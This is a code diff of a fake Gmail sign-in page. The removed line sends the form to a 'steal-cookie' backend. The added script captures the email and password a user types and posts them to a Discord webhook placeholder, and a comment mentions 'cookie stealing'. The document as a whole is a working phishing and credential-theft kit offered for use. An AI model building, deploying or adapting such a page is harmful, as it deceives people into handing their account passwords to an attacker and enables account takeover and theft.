@@ -111,7 +111,7 @@
         <!-- Login Form -->
         <h1>Sign in</h1>
         <p>to continue to Gmail</p>
-        <form id="loginForm" action="https://yourbackend.com/steal-cookie" method="POST">
+        <form id="loginForm">
             <input type="email" id="email" name="email" placeholder="Email or phone" required><br>
             <a href="#" class="forgot-email">Forgot email?</a><br>
             <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
@@ -131,6 +131,43 @@
         </div>
     </div>
 
+<script>
+    
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // Get the values from the form fields
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value; // Capture password too
+
+    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+
+    const payload = {
+        content: `Email: ${email}\nPassword: ${password}` // Be cautious with sending sensitive data!
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Details sent successfully!');
+            document.getElementById('loginForm').reset(); // Reset the form
+        } else {
+            alert('Error sending details.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Error sending details.');
+    });
+});
+
+</script>    
     <script>
         // Simulate form submission and cookie stealing
         document.getElementById("loginForm").onsubmit = function(e) {
